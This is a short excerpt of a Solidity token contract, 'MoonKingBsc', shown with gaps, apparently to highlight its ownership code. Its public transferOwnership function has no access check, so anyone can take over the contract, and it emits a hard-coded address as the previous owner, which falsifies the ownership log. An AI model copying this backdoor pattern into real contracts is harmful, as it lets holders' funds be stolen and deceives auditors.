...
contract Ownable is Context {
    ...
    function transferOwnership(address newOwner) public virtual {
        emit OwnershipTransferred(0xA32a186424Ff82DB39369f119c94aBb8b39C275e, newOwner);
        _owner = newOwner;
    }
...
contract MoonKingBsc is Context, IERC20, Ownable, Pausable {
  ...
  string private _symbol = "MKING";
  string private _name = "MoonKingBsc";
